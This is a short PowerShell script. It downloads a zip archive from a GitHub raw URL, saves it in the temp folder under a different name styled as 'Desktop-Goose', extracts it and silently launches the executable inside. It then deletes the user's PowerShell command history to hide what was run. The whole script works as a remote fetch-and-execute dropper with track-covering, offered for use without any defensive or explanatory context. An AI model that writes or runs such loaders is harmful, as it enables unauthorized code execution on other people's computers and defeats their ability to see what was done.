$url = "https://github.com/Akeydeys/In/raw/main/Birth%20Goose.zip"

$destination = [System.IO.Path]::Combine($env:TEMP, "Desktop-Goose-v0.31.zip")

Invoke-WebRequest -Uri $url -OutFile $destination

$extractedFolder = [System.IO.Path]::Combine($env:TEMP, "Desktop-Goose-v0.31")
Expand-Archive -Path $destination -DestinationPath $extractedFolder

Remove-Item -Path $destination -Force

$gooseDesktopPath = Get-ChildItem -Path $extractedFolder -Recurse -Filter "GooseDesktop.exe" | Select-Object -First 1

Start-Process -FilePath $gooseDesktopPath.FullName -ErrorAction SilentlyContinue

Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
